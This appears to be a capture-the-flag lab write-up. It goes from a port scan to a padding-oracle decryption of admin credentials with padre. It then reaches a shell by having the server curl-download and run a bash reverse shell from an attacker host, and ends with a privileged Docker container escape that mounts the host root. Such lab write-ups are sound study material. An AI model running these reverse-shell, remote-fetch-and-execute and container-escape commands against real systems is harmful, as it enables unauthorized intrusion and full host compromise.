### Open Ports 
```bash
rustscan -a 10.10.222.223 -- -A

Open 10.10.222.223:22
Open 10.10.222.223:8080

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:ca:9b:d0:87:49:fa:ca:3f:22:8f:b9:be:13:0a:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+7wzW9kCNp+uu6HhEwColKV7w1YMF2vQp54IZtaxl/Jwi/my6ZXXVNWot8gdo7pfiJn7TlscQrvvt+Vl4RNAXAJT9Xw54TCYKl0dec/ZTR70J26sSUQ+ZZoSN7myKA0z4YIX9oAM8mFNj1kyZET/qN4pvkxKmAu1Y57bKF0JrVxvqJuZRC9p1x1ta8wuBH5zw0+zAX9owKEnAyC2xNfyUlsthdg3Ex73kNvfonsf7Mp0cbFgoFxfkJU92QaiUwlW4AK5ndNQTeoiSjplJYwH2kk4Z0A5U/ZZmYdlJZxiXTDFlsQZSvWkOYcpha57cSXqEIdvMNt2bVKJuAyNVQalqRibScZi7KYMBO149ddlSEHdOBbn8PlT/jOiVHeZAQ8btYmajKUbCntiRAniEqk5406CoGRBQjES1uHFgr+7YB0ldSU1ZaM1EyZJdPwnT4GxsqhEWWts5jceo1nclus7g19NoJEIaQk1OYMJem+9tz5KevywN4HCA+MHQlLr+dbM=
|   256 76:dd:92:e8:a6:b3:1e:5e:fa:65:58:51:60:df:d0:57 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJsgaavxme16EtlR70MrOolHpg0ydlNfD6GAkACrgeq+fnR6Xo51AC69htHzAv3CccWejGKsz+3DiQtDl5VTl34=
|   256 1e:74:c2:e4:b0:2b:e8:ae:de:62:ab:f2:9c:05:eb:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmncCRZgt+khBwwM3uSdDRm2410bhYQz+Mjih8TLsYa
8080/tcp open  http    syn-ack ttl 59 Octoshape P2P streaming web service
| http-methods: 
|_  Supported Methods: GET
|_http-title: Hello world!
|_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/28%OT=22%CT=%CU=42374%PV=Y%DS=5%DC=T%G=N%TM=680EED54
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW
OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%
OS:W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 15.740 days (since Sat Apr 12 15:06:39 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In Site: 
![[nyf1.png]]
In code view I found a script:
![[nyf2.png]]
In Debug page code view:
![[nyf3.png]]
According to the first script I added a cookie named `loggedin` and refreshed the page and the admin buffot changed to DEBUG
![[nyf4.png]]
Clicking the stefan test I found 
![[nyf5.png]]
Using the padre tool I decrypted the blob
```bash
padre -u "http://10.10.222.223:8080/api/debug/$" -e lhex -err "Decryption error" "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"
```
![[nyf6.png]]
So the decrypted blob is
`stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599`
Using this credential I logged in as admin and got the admin flag. 
![[nyf7.png]]
Now do the following to get the shell:
Create a file with the following reverse shell 
```bash
/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```
Open a http server on the attacking machine and upload the file. 
Upload the file to the server executing the following command on the page.
`curl http://<attacker_ip:attacker_port>/shell.sh -o /tmp/shell.sh`
Open a listening port on the port 4444 to get the reverse shell.
Give the shell executing privilege and execute it runnig the following command on the site. 
`chmod +x /tmp/shell.sh && bash /tmp/shell.sh`
![[nyf8.png]]

The flag-2 is in the `/app/docker-compose.yml`
To escape the docker do the following:
```bash
root@02e849f307cc:/tmp# docker images
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
padding-oracle-app_web   latest    cd6261dd9dda   11 months ago   1.01GB
<none>                   <none>    4187efabd0a5   11 months ago   704MB
gradle                   7-jdk11   d5954e1d9fa4   12 months ago   687MB
openjdk                  11        47a932d998b7   2 years ago     654MB
```
Using the image ID of gradle `d5954e1d9fa4`.
Running the following command:
`docker run -it --privileged  -v /:/mnt/ d5954e1d9fa4 chroot /mnt/ bash`
![[nyf9.png]]
